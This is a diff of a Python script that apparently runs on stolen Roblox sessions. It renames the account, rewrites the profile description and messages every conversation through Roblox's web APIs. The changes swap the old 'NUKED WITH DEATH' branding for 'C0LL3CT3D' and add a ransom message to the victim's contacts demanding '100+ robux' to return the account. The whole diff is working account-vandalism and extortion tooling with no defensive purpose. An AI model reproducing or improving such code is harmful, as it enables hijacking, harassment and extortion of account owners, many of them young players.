@@ -30,7 +30,7 @@ async def start(self):
 async def change_name(session, id):
     async with session.get(f"https://users.roblox.com/v1/users/{id}/display-names/validate?displayName=aaaaa", ssl=False) as response:
         if response.status == 200:
-            async with session.patch(f"https://users.roblox.com/v1/users/{id}/display-names", json={"newDisplayName": "NUKEDWITHDEATH"}, ssl=False) as response:
+            async with session.patch(f"https://users.roblox.com/v1/users/{id}/display-names", json={"newDisplayName": "C0LL3CT3D"}, ssl=False) as response:
                 if response.status == 200:
                     cprint.success("Changed user display name!")
                     return
@@ -40,7 +40,7 @@ async def change_name(session, id):
 
 ########## CHANGE DESCRIPTION ##########
 async def change_desc(session):
-    async with session.post("https://users.roblox.com/v1/description", json={"description": "NUKED WITH DEATH .gg/deathsniper"}, ssl=False) as response:
+    async with session.post("https://users.roblox.com/v1/description", json={"description": "Hello! This account has been C0LL3CT3D"}, ssl=False) as response:
         if response.status == 200:
             cprint.success("Changed description!")
             return
@@ -61,7 +61,7 @@ async def change_lang(session):
 async def message_all(session):
     convs = await get_convs(session)
     if convs is not None and len(convs) >= 1:
-        tasks = [asyncio.create_task(send_message(session, conv)) for conv in convs for i in range(5)]
+        tasks = [asyncio.create_task(send_message(session, conv)) for conv in convs for i in range(1)]
         await asyncio.gather(*tasks)
 
 async def get_convs(session):
@@ -75,7 +75,7 @@ async def get_convs(session):
             return None
 
 async def send_message(session, conv):
-    async with session.post("https://chat.roblox.com/v2/send-message", json={"conversationId": conv["id"], "message": "NUKED WITH DEATH"}, ssl=False) as response:
+    async with session.post("https://chat.roblox.com/v2/send-message", json={"conversationId": conv["id"], "message": "Hello! This account has as of recently been T4RG3T3D./nAnd has now officially been SCR4P3D and C0LL3CT3D./nTo return this account to the previous owner:/nPay 100+ robux."}, ssl=False) as response:
         if response.status == 200:
             data = await response.json()
             cprint.success(f"Sent a message to {conv['title']}!")
@@ -188,4 +188,5 @@ async def get_games(session, id):
             else:
                 cprint.error("Failed to fetch games")
                 return None
+
 
